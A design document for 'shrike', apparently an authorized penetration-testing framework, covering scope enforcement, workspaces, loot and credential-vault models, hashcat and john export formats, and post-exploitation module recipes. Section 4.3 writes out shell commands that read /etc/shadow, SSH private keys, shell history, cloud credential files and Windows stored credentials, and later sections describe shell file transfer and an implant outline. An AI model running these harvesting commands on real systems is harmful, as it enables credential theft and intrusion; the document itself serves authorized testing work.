# FRAMEWORK.md — Making shrike feel like a complete, professional offensive framework

Scope of this doc: concrete, implementable design guidance for the features that separate a
"collection of tools" from a *framework*. Grounded in how Metasploit, Sliver, Havoc, and
Cobalt Strike solve the same problems, plus pentest reporting standards (PTES, a typical SOW).

Assumed current state of shrike: tool catalog + suggestion engine, campaign mode, findings +
MITRE mapping, attack-chain guidance, tabbed dashboard, interactive session handoff, managed
reverse-shell listeners with auto-attach, payload generator. Storage: one engagement per
workspace dir (`engagement.json` + `notes.md` + `report.html` + `loot/`).

Everything below is written to slot into that model. Rust types are illustrative (serde-friendly).

---

## 1. Engagement scope & metadata

### 1.1 Why this matters
Scope is the single most load-bearing piece of professional metadata. It (a) drives the report
header every client expects, (b) is the legal/ROE boundary, and (c) enables an automated guard
that prevents the single worst operator mistake: firing a tool at an out-of-scope host. MSF has
no real scope enforcement (workspaces are just tagging); Cobalt Strike has none either. A
built-in scope guard is a genuine differentiator, not just parity.

### 1.2 How the mature tools / standards represent scope (grounding)
- **Metasploit workspaces**: a workspace is only a logical container in the DB (hosts, services,
  creds, loot, notes, sessions are foreign-keyed to a `workspace_id`). There is *no* in/out-of-scope
  list and *no* guard — operators self-police. `workspace -a client_x`, `db_nmap` writes into the
  current workspace. Lesson: adopt the container idea, add the guard they lack.
- **Cobalt Strike**: scope lives in the operator's head / the team's notes; the tool tracks
  targets in a Targets table but does not block on scope. Malleable C2 profiles are config, not scope.
- **PTES / SOW / ROE**: a Statement of Work + Rules of Engagement define, at minimum: authorized
  IP ranges & domains, explicit exclusions, testing window (start/end dates, allowed hours),
  permitted techniques (e.g. "no DoS", "no social engineering", "no exploitation of prod DB
  servers"), emergency contacts, and a signed-authorization reference. A pentest report's first
  substantive section is *Scope* and *Methodology*. shrike's scope model should map 1:1 onto the
  report's Scope section so the report is a projection of the data, not re-typed.

### 1.3 Data model
```rust
struct Scope {
    // In-scope: if non-empty, ONLY these match as in-scope ("allowlist" mode).
    // If empty, mode is "everything-not-excluded" (see precedence).
    in_scope:  Vec<ScopeEntry>,
    out_scope: Vec<ScopeEntry>,   // always wins
    // Technique policy (advisory guard, matched by tool tags):
    allowed_techniques:   Vec<String>, // e.g. ["exploitation","credential-access"]
    forbidden_techniques: Vec<String>, // e.g. ["dos","social-engineering","phishing"]
    allowed_hours: Option<TimeWindow>, // e.g. 09:00-17:00 client TZ; warn outside
}

enum ScopeEntry {
    Cidr(IpNet),          // 10.0.0.0/24, 2001:db8::/32
    Ip(IpAddr),           // single host
    HostGlob(String),     // "*.corp.example.com"
    UrlHost(String),      // "app.example.com" for web targets
}

struct Engagement {
    // --- identity / ROE metadata (report header) ---
    id: String,                 // slug, also the workspace dir name
    client_name: String,
    engagement_name: String,    // "Q3 External Network Pentest"
    operator: String,           // lead operator handle / name
    operators: Vec<String>,     // team, optional
    roe_reference: String,      // SOW/contract/ticket id, e.g. "SOW-2026-0412"
    authorization_contact: String, // name + email/phone of client authorizer
    start_date: NaiveDate,
    end_date: NaiveDate,
    scope: Scope,
    notes: String,              // free-form; mirrors notes.md
    created: DateTime<Utc>,
    updated: DateTime<Utc>,
}
```
Persist as a `scope` object inside `engagement.json` (do not fork a new file). The report header
reads directly from these fields; add a "Scope" table (in-scope, out-of-scope, window, forbidden
techniques) generated from `Scope`.

### 1.4 SCOPE-CHECK function — exact precedence
Return type:
```rust
enum ScopeVerdict { InScope, OutOfScope, Unknown }
struct ScopeResult { verdict: ScopeVerdict, matched: Option<String>, reason: String }
```
**Precedence logic (evaluate in this exact order; first hit wins):**

1. **Out-of-scope wins, always.** If the target matches ANY `out_scope` entry →
   `OutOfScope`. This check is first and unconditional. No in-scope entry can override it
   (a /24 in-scope with a single excluded host: the host is out).
2. **Explicit in-scope allowlist.** Else if `in_scope` is **non-empty**:
   - matches an `in_scope` entry → `InScope`.
   - matches nothing → `OutOfScope`? No — return **`Unknown`** *only* if you want "warn,
     don't block"; return `OutOfScope` if you want strict allowlist. **Recommended: strict.**
     When `in_scope` is non-empty, anything not listed and not excluded = `OutOfScope`.
     (Rationale: an explicit allowlist is a positive assertion of the full authorized surface.)
3. **"Everything not excluded" mode.** Else (`in_scope` is **empty**):
   - already passed step 1 (not excluded) → return **`Unknown`**, not `InScope`.
     Rationale: with no allowlist you cannot *assert* authorization; you can only assert it is
     not explicitly forbidden. `Unknown` = "no exclusion hit, but not affirmatively in scope" →
     the guard warns (yellow), does not hard-block.

**Matching details:**
- IP-in-CIDR uses proper network containment (use the `ipnet` crate); support v4 and v6.
- A bare `Ip` in a list matches only that address.
- `HostGlob`/`UrlHost` match when the *target* is a hostname/URL (resolve-optional: match on the
  literal name first; optionally also check resolved A/AAAA against IP entries, but keep DNS
  resolution opt-in to avoid tipping off / leaking).
- Normalize inputs: strip scheme/port/path from URL targets before host match.

### 1.5 The guard (pre-flight)
Wrap tool execution: before shrike runs any tool that takes a target IP/host, call scope-check on
the resolved target(s).
```
InScope    -> run silently.
Unknown    -> print yellow warning "target X is not in an explicit in-scope list (mode:
              everything-not-excluded). Proceed? [y/N]"  (configurable: --force to skip).
OutOfScope -> RED block. Refuse by default. Require explicit `--override-scope "<reason>"`;
              log the override (operator, target, tool, reason, ts) to loot/scope-overrides.log
              AND surface it in the report as an audit line. Never silently allow.
```
Guard placement: single choke point at the "run tool with target" boundary so every tool
(catalog, campaign, payload-delivery, listener target) inherits it. Multi-target tools (a CIDR
sweep) run scope-check per resolved host and split into allowed/blocked sets; report the blocked
set rather than aborting the whole sweep.

---

## 2. Workspaces / multi-engagement

### 2.1 How MSF does it
`workspace` (list), `workspace -a <name>` (add), `workspace <name>` (switch), `workspace -d <name>`
(delete). The current workspace is process state; all DB writes scope to it. Everything is one
Postgres DB partitioned by `workspace_id`. Simple, and that simplicity is the point.

### 2.2 Minimal shrike design
Keep the "one dir per engagement" model — it's already better than MSF for portability (each
engagement is a self-contained, git-able, zippable folder). Add a thin manager over a **base dir**.

```
$SHRIKE_HOME/            (default ~/.shrike or $SHRIKE_HOME)
  engagements/
    acme-external-q3/    <- engagement.id == dir name
      engagement.json
      notes.md
      report.html
      loot/
    bravo-internal/
      ...
  current -> engagements/acme-external-q3   (symlink OR a state file)
  config.toml            (global: default operator, editor, etc.)
```
Current-engagement pointer: a `current` symlink is cleanest on Unix; for cross-platform use a
`state.json` with `{ "current": "acme-external-q3" }`. Prefer state.json (Windows).

Commands (map to whatever your CLI/dashboard verb style is):
- `shrike engagement list` — table: id, client, operator, start–end, #findings, #loot, #sessions.
- `shrike engagement new <id> [--client .. --operator .. --roe ..]` — scaffolds the dir + a
  skeleton `engagement.json` (prompts for scope, or `--in 10.0.0.0/24 --out 10.0.0.5`).
- `shrike engagement use <id>` — switch current pointer; validate dir exists.
- `shrike engagement show` — print current metadata + scope summary.
- `shrike engagement archive <id>` — zip the dir to `engagements/_archive/<id>.zip` (do NOT
  hard-delete; deletion is prohibited-by-policy destructive — leave that to the operator).

Design rules to keep it simple: no DB, no daemon; the base dir *is* the database. Loading an
engagement = read its `engagement.json`. Listing = glob `engagements/*/engagement.json` and read
headers. Everything already keyed to the workspace dir stays working; you only add the pointer +
list/switch/new verbs.

---

## 3. Loot & evidence model

### 3.1 How MSF / Cobalt Strike organize captured data
- **MSF `loot`**: each loot row = `{ host, service, type, name, content_type, path, info,
  created_at }`. Files land under `~/.msf4/loot/` with mangled names; the DB row carries the
  metadata. `loot -t <type>` filters; post modules auto-add loot (e.g. `windows/gather/hashdump`
  writes hashes as loot). `creds` is a *separate* richer store: `{ host, service, public
  (username), private (password/hash), private_type (password|nonreplayable_hash|ntlm_hash|
  postgres_md5|...), realm, origin }`.
- **Cobalt Strike**: "Downloads" tab = files pulled from beacons, keyed by host/beacon with size,
  path, timestamp. Credentials go to a Credentials model. Screenshots and keystrokes are separate
  typed views. The through-line: every captured artifact is *typed*, *host-attributed*, and
  *timestamped*, with the raw bytes stored on disk and metadata in a queryable index.

Takeaway for shrike: keep raw bytes in `loot/` on disk; keep a typed metadata index in
`engagement.json` (or `loot/index.json`). Credentials get a richer sub-model because they have
export needs.

### 3.2 `LootItem` schema
```rust
enum LootKind { File, Creds, Hash, Screenshot, Ticket, Config }
// Ticket = Kerberos ticket (.kirbi/ccache); Config = captured config file; Hash = raw hash line(s)

struct LootItem {
    id: String,              // short uid
    kind: LootKind,
    host: String,            // IP or hostname the artifact came from
    source: String,          // how obtained: tool/module/session name, e.g. "linux-quick-recon" or "smbclient"
    path: PathBuf,           // relative path under loot/ for File/Screenshot/Ticket/Config; empty for inline creds
    service: Option<String>, // "smb", "ssh", "http:8080" — optional, MSF-style
    notes: String,
    ts: DateTime<Utc>,
    tags: Vec<String>,       // freeform, e.g. ["domain-admin","reused"]
}
```
On-disk layout under the engagement's `loot/`:
```
loot/
  index.json                  <- Vec<LootItem> (or embed in engagement.json)
  files/    <host>/<id>-<origname>
  screenshots/<host>/<id>.png
  tickets/  <host>/<id>.kirbi
  configs/  <host>/<id>-<name>.conf
  creds.json                  <- Vec<Credential> (the vault, see 3.4)
  scope-overrides.log
```

### 3.3 What `/loot` view should show
A filterable table + detail pane:
- **Columns**: ts, kind (icon), host, source, service, short notes, size (for files), tags.
- **Filters/quick-verbs**: by kind (`/loot creds`, `/loot screenshots`), by host (`/loot host
  10.0.0.5`), by tag, full-text over notes/source.
- **Summary bar**: counts per kind, unique hosts, #credentials, #cracked-vs-uncracked hashes.
- **Detail/actions**: open file (delegate to `$EDITOR`/viewer), reveal-in-loot-dir, copy path,
  add note/tag, and for creds: the export actions in 3.5.
- **Report tie-in**: loot feeds the report's Evidence appendix; each finding can reference loot
  ids so screenshots/hashes appear inline as proof.

### 3.4 Credential vault sub-model
Creds deserve their own store because they carry crack-state and drive exports.
```rust
enum SecretKind { Plaintext, NtlmHash, NetNtlmV2, Sha512Crypt, Md5Crypt, Bcrypt,
                  MsCache2, KerberosTgs, KerberosAsRep, Other(String) }

struct Credential {
    id: String,
    username: String,
    realm: Option<String>,        // domain / AD realm
    secret: String,               // plaintext OR the hash string
    kind: SecretKind,
    host: String,                 // where captured
    service: Option<String>,
    source: String,
    cracked: bool,                // for hashes: has plaintext been recovered?
    plaintext: Option<String>,    // filled once cracked
    ts: DateTime<Utc>,
    tags: Vec<String>,            // ["domain-admin","local-admin","reused"]
}
```

### 3.5 Credential-vault EXPORT formats (implement all four)
Filter the vault (by kind/host/tag), then serialize. Each export is a pure function
`Vec<Credential> -> String/File`.

**A. hashcat — per mode.** Group by `SecretKind`, one file/blob per hashcat `-m` mode, because
hashcat cracks one mode per run. Emit the hash in the exact layout that mode expects.

| SecretKind    | hashcat `-m` | line format written                              |
|---------------|--------------|--------------------------------------------------|
| NtlmHash      | 1000         | `<hash>`  (32-hex) — or `user:hash` for potfile clarity, but plain `<hash>` is safest |
| NetNtlmV2     | 5600         | full `user::DOMAIN:challenge:HMAC:blob` line as captured |
| Sha512Crypt   | 1800         | `$6$salt$hash`                                   |
| Md5Crypt      | 500          | `$1$salt$hash`                                   |
| Bcrypt        | 3200         | `$2b$...`                                         |
| MsCache2      | 2100         | `$DCC2$iter#user#hash`                            |
| KerberosTgs   | 13100        | `$krb5tgs$23$...` (kerberoast)                   |
| KerberosAsRep | 18200        | `$krb5asrep$23$...` (AS-REP roast)               |

Output naming: `export/hashcat-m1000.txt`, `export/hashcat-m5600.txt`, etc. Also emit a tiny
`export/hashcat-commands.sh` with the suggested `hashcat -m <mode> <file> <wordlist>` line per file.
(For NTLM/NetNTLM, write bare hash lines but keep a side map id→username so you can re-associate
after cracking; or use the `user:hash` "username" mode and pass `--username` to hashcat.)

**B. john.** John autodetects most formats, so a single `export/john.txt` with `user:hash` lines
usually works; still group note the `--format=` hint (`nt`, `netntlmv2`, `sha512crypt`, `md5crypt`,
`bcrypt`, `krb5tgs`, `krb5asrep`) in a header comment or a `export/john-formats.txt` map, since
John's format names differ from hashcat mode numbers.

**C. CSV.** `export/creds.csv` — full fidelity for the report/handoff:
`id,username,realm,kind,secret,cracked,plaintext,host,service,source,ts,tags`
Quote fields; this is the human/spreadsheet view and the report appendix source.

**D. Plain `user:pass`.** `export/userpass.txt` — only `cracked==true` (or `Plaintext`) creds,
one `username:plaintext` per line. This is the reuse/spray/validation list operators actually feed
back into tools (crackmapexec, hydra, ssh loops). Optionally also `export/users.txt` and
`export/passwords.txt` (deduped columns) for spraying.

Import path (nice-to-have): let cracking results flow back — `shrike creds import-potfile
hashcat.potfile` matches recovered plaintext by hash and flips `cracked=true`, fills `plaintext`.

---

## 4. Post-ex "session modules" concept

### 4.1 How MSF frames it
Post modules (`post/<os>/<category>/<name>`) run against a `session`; they take options
(`set SESSION 3`) and datastore, execute against the session's shell/meterpreter, and write results
to loot/notes. shrike's caught shells are raw (not meterpreter), so the lightweight analog is: a
*named, ordered recipe of shell commands*, per-OS, piped through the raw shell, with output
captured into loot. Think "runbook", not "binary payload". (Sliver has `armory`/aliases; Havoc has
modules/BOFs — both heavier. A static command-recipe registry is the right weight for shrike.)

### 4.2 Data shape
```rust
enum ModuleOs { Linux, Windows, MacOS, Any }

struct SessionModule {
    name: String,                 // "linux-quick-recon"
    os: ModuleOs,
    description: String,
    // ordered steps; each captured separately so output is labeled in loot
    steps: Vec<ModuleStep>,
    // what MITRE technique(s) this maps to, to auto-feed findings/ATT&CK map
    mitre: Vec<String>,           // ["T1082","T1083"]
    // where captured output should land
    loot_kind: LootKind,          // usually File; Creds for harvesters
    safe: bool,                   // true = read-only recon; false = touches disk/mutates
}

struct ModuleStep {
    label: String,                // "kernel & os"
    cmd: String,                  // exact shell line; keep POSIX for Linux, cmd/pwsh for Windows
    // optional: only run if a prior probe succeeded (kept simple: skip-on-error is default)
    optional: bool,
}
```
Execution model: for each step, write `cmd\n` to the caught socket, read until a sentinel
(echo a random marker after the cmd and read to it — you almost certainly already do this for the
interactive handoff), capture stdout, store the concatenated labeled transcript as one `LootItem`
(kind=File, source=module name, host=session host). Match `module.os` against the session's
detected OS (or `Any`); refuse to run a Windows module on a Linux shell. Respect the scope guard
(the session host must be in scope — it will be, since you caught it, but keep the invariant).

### 4.3 Static registry — 8 concrete modules

```rust
// 1
SessionModule { name:"linux-quick-recon", os:Linux, safe:true, mitre:["T1082","T1083","T1033"],
  loot_kind:File, description:"Fast host/user/network situational awareness.",
  steps: [
    ("os",        "uname -a; cat /etc/os-release 2>/dev/null"),
    ("whoami",    "id; who; w"),
    ("network",   "ip a 2>/dev/null || ifconfig; ip r 2>/dev/null || route -n"),
    ("listening", "ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null"),
    ("procs",     "ps aux --sort=-%mem | head -n 30"),
    ("mounts",    "mount; df -h"),
  ]},

// 2
SessionModule { name:"linux-priv-check", os:Linux, safe:true, mitre:["T1548","T1069","T1033"],
  loot_kind:File, description:"Local privesc surface: sudo, SUID, caps, cron, writable paths.",
  steps: [
    ("sudo",      "sudo -n -l 2>/dev/null; cat /etc/sudoers 2>/dev/null"),
    ("suid",      "find / -perm -4000 -type f 2>/dev/null"),
    ("caps",      "getcap -r / 2>/dev/null"),
    ("cron",      "cat /etc/crontab; ls -la /etc/cron.* 2>/dev/null; crontab -l 2>/dev/null"),
    ("writable",  "find / -writable -type d 2>/dev/null | grep -vE '^/proc|^/sys' | head"),
    ("kernel",    "uname -r; cat /proc/version"),
  ]},

// 3
SessionModule { name:"harvest-ssh-keys", os:Linux, safe:true, mitre:["T1552.004"],
  loot_kind:Creds, description:"Collect SSH private keys, authorized_keys, known_hosts, configs.",
  steps: [
    ("home-keys", "for d in /home/* /root; do echo \"== $d ==\"; cat $d/.ssh/id_* 2>/dev/null; done"),
    ("authkeys",  "for d in /home/* /root; do cat $d/.ssh/authorized_keys 2>/dev/null; done"),
    ("known",     "for d in /home/* /root; do cat $d/.ssh/known_hosts 2>/dev/null; done"),
    ("config",    "for d in /home/* /root; do cat $d/.ssh/config 2>/dev/null; done"),
  ]},

// 4
SessionModule { name:"linux-cred-hunt", os:Linux, safe:true, mitre:["T1552.001","T1552.002"],
  loot_kind:Creds, description:"Grep filesystem/history/env for secrets.",
  steps: [
    ("shadow",    "cat /etc/shadow 2>/dev/null"),
    ("history",   "cat ~/.bash_history /home/*/.bash_history 2>/dev/null"),
    ("env",       "env; cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n'"),
    ("dotfiles",  "grep -rIEl '(password|passwd|secret|api[_-]?key|token)' /home /var/www /opt /etc 2>/dev/null | head -n 40"),
    ("cloud",     "cat ~/.aws/credentials ~/.config/gcloud/*.json /root/.aws/credentials 2>/dev/null"),
  ]},

// 5
SessionModule { name:"windows-priv-check", os:Windows, safe:true, mitre:["T1082","T1069","T1518"],
  loot_kind:File, description:"Windows privesc & situational recon (cmd/pwsh).",
  steps: [
    ("whoami",    "whoami /all"),
    ("systeminfo","systeminfo"),
    ("patches",   "wmic qfe get HotFixID,InstalledOn 2>nul"),
    ("services",  "wmic service get Name,PathName,StartMode 2>nul | findstr /i /v \"C:\\Windows\""),
    ("unquoted",  "wmic service get name,pathname,startmode 2>nul | findstr /i /v \"\\\"\" | findstr /i \" \" "),
    ("net",       "ipconfig /all & route print & arp -a"),
    ("shares",    "net share & net use"),
  ]},

// 6
SessionModule { name:"windows-cred-hunt", os:Windows, safe:true, mitre:["T1552.001","T1555"],
  loot_kind:Creds, description:"Look for stored creds, unattend files, registry autologon.",
  steps: [
    ("cmdkey",    "cmdkey /list"),
    ("unattend",  "type C:\\Windows\\Panther\\Unattend.xml 2>nul & type C:\\Windows\\Panther\\Unattended.xml 2>nul"),
    ("autologon", "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" 2>nul"),
    ("vault",     "vaultcmd /listcreds:\"Windows Credentials\" /all 2>nul"),
    ("grep",      "findstr /si password *.xml *.ini *.txt *.config 2>nul"),
  ]},

// 7
SessionModule { name:"windows-domain-recon", os:Windows, safe:true, mitre:["T1087.002","T1482","T1018"],
  loot_kind:File, description:"AD/domain enumeration from an unprivileged shell.",
  steps: [
    ("domain",    "echo %USERDOMAIN% & net config workstation"),
    ("users",     "net user /domain"),
    ("admins",    "net group \"Domain Admins\" /domain & net group \"Enterprise Admins\" /domain"),
    ("dcs",       "nltest /dclist:%USERDOMAIN% 2>nul"),
    ("trusts",    "nltest /domain_trusts 2>nul"),
  ]},

// 8
SessionModule { name:"persistence-audit", os:Any, safe:true, mitre:["T1053","T1543","T1547"],
  loot_kind:File, description:"Enumerate existing persistence mechanisms (read-only audit).",
  steps: [
    // dispatched by os at runtime; keep two variants or gate lines with os check upstream
    ("linux-svc", "systemctl list-unit-files --type=service 2>/dev/null | grep enabled; ls -la /etc/systemd/system"),
    ("linux-cron","crontab -l 2>/dev/null; ls -la /etc/cron.d /etc/cron.daily 2>/dev/null"),
    ("win-run",   "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run 2>nul & schtasks /query /fo LIST 2>nul"),
  ]},
```
(For `Any` modules, either split into per-OS modules or gate each step by the session's detected OS
at dispatch — splitting is cleaner. Keep all default modules `safe:true`/read-only; mark any that
write disk as `safe:false` and confirm before running, mirroring the scope-guard confirm UX.)

Registry wiring: expose `/modules` (list, filtered by session OS), `/run <module> [session]`.
On completion: store transcript as loot, and auto-create a low-severity Finding stub pre-tagged
with the module's `mitre` ids so the ATT&CK map lights up for free.

---

## 5. Gap analysis — what makes it feel like a framework

Honest, prioritized. Effort tags: **S** ≈ hours, **M** ≈ a day or few, **L** ≈ multi-day/subsystem.
Ordered by impact-per-effort for "feels complete & professional".

1. **Scope model + pre-flight scope guard — M.** Section 1. Highest professional-credibility win;
   nothing else here signals "real engagement tooling" as strongly, and it's genuinely absent from
   MSF/CS. Ship this first.

2. **Resource / `.rc` replay scripts — S.** A plain-text list of shrike commands run
   non-interactively (`shrike -r recon.rc` / `/resource file`), plus `/makerc` that dumps the
   current session's command history to a file (exactly MSF's `resource`/`makerc`). Turns ad-hoc
   runs into repeatable, reviewable playbooks. Trivial to build, huge "framework" feel.

3. **Global search across catalog + sessions + loot + findings — S.** One `/search <term>` that
   greps the tool catalog, session transcripts, loot notes, creds, and findings, returning typed
   hits. MSF has `search` only over modules; unifying it is a small, high-visibility polish.

4. **Session modules (command-recipe runbooks) — M.** Section 4. Converts raw shells from "a prompt
   you type into" to "a session you run modules against" — the mental model shift that makes MSF
   *feel* like a framework. Static registry keeps it cheap.

5. **Credential vault + exports — M.** Section 3.4/3.5. The creds store + four export formats. Every
   serious engagement produces hashes; being the tool that both stores and hands them to
   hashcat/john in the right shape is table-stakes for "complete".

6. **Session file transfer (base64-over-socket) — M.** `/download <remote>` and `/upload <local>
   <remote>` over the raw shell via base64 (`base64 -w0 <f>` / `certutil -encode`; reverse with
   `base64 -d` / `certutil -decode`), chunked with integrity check (size + sha256). This is the
   single most-missed capability of a raw shell vs meterpreter/beacon; downloaded files auto-land
   in loot. Keep it protocol-simple (no custom agent).

7. **Findings ↔ loot ↔ report cross-linking + polished report export — M.** Let a Finding reference
   loot ids and creds; render screenshots/hash evidence inline; make the HTML report a faithful
   projection of engagement.json (scope header, methodology, findings by severity, evidence
   appendix, ATT&CK coverage). You have the pieces; wiring them into one coherent report is what
   clients actually pay for. Optionally add PDF/markdown export.

8. **Multi-engagement manager — S.** Section 2. `list/new/use/show/archive` over a base dir. Small,
   and it's the difference between "a tool I point at a folder" and "a workspace I live in".

9. **Listener/session persistence & reconnect across restarts — M.** Persist listener configs and
   last-known sessions to the engagement dir so a shrike restart re-arms listeners and shows dead
   sessions as "lost" rather than losing all state. Operators trust tools that survive a crash.

10. **Beacon / async agent (implant) — L, likely out of scope.** A real Sliver/Havoc-style
    compiled implant with async task queue, jitter/sleep, and its own C2 protocol. This is a
    multi-week subsystem (implant build pipeline, crypto, comms, opsec) and a different product
    tier than "managed reverse shells + modules". Recommend explicitly *deferring* and saying so in
    docs — it keeps scope honest. If ever pursued: start with a minimal HTTP long-poll agent
    (check-in → pull queued module commands → post results) reusing the session-module recipes as
    the task vocabulary, so the framework value compounds rather than forking.

**Suggested build order:** 1 → 2 → 3 → 8 → 5 → 4 → 6 → 7 → 9, defer 10. That front-loads the
cheap high-signal wins (scope, rc, search, workspaces) then the substantive subsystems (creds,
modules, transfer, report), leaving the implant as an explicit non-goal.

---

## Sources (grounding)
- Metasploit database/workspaces/loot/creds model — Offensive Security, *Metasploit Unleashed:
  Using the Database*: https://www.offsec.com/metasploit-unleashed/using-databases/ and
  https://www.offsec.com/metasploit-unleashed/database-introduction/
- Metasploit DB cheatsheet (hosts/services/creds/loot/notes/vulns/workspace):
  https://www.hackingarticles.in/metasploit-for-pentester-database-workspace/
- Hashcat mode numbers (1000 NTLM, 5600 NetNTLMv2, 1800 sha512crypt, 500 md5crypt, 3200 bcrypt,
  2100 DCC2, 13100 kerberoast, 18200 AS-REP) — BHIS Hashcat Cheat Sheet:
  https://www.blackhillsinfosec.com/wp-content/uploads/2020/09/HashcatCheatSheet.v2018.1b.pdf
  and https://github.com/swisskyrepo/InternalAllTheThings (hash-capture).
